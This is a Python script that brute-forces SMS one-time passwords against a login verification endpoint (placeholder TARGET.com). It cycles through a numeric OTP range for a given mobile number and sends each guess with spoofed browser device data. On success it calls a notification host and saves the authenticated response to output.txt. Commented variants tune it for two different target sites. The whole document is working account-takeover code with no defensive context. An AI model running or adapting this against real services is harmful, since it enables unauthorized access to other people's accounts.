import requests
import json
import sys

mobile_number = sys.argv[1]
otp_from = int(sys.argv[2])
otp_to = int(sys.argv[3])
for genOTP in range(otp_from, otp_to, 1):
    # Send Login
    login_url = 'https://TARGET.com/api/v4/user/verify'

    # Target-1
    #data = {'mobile': mobile_number, 'otp': genOTP}
    
    # Target-2
    data = {'mobile': mobile_number,
            'otp': genOTP,
            'device_info': {
                'brand': '',
                'model': '',
                'browserVersion': '112.0.0.0',
                'app_version': '',
                'by': 'web',
                'osName': 'Linux',
                'osVersion': 'x86_64',
                'browserName': 'Chrome'
                },
            'device': 'web'
            }
    
    res_login = requests.post(login_url, data=data)
    if res_login.status_code == 200:
        # # Target-1
        # requests.get("https://NOTIF.com/otp/done")
        # out_file = open('output.txt', 'w')
        # out_file.write(str(res_login.content))
        # break
        
        # Target-2
        jsonn = json.loads(res_login.content)
        if jsonn["status"] == 1:
            requests.get("https://NOTIF.com/otp/done")
            out_file = open('output.txt', 'w')
            out_file.write(str(res_login.content))
            break
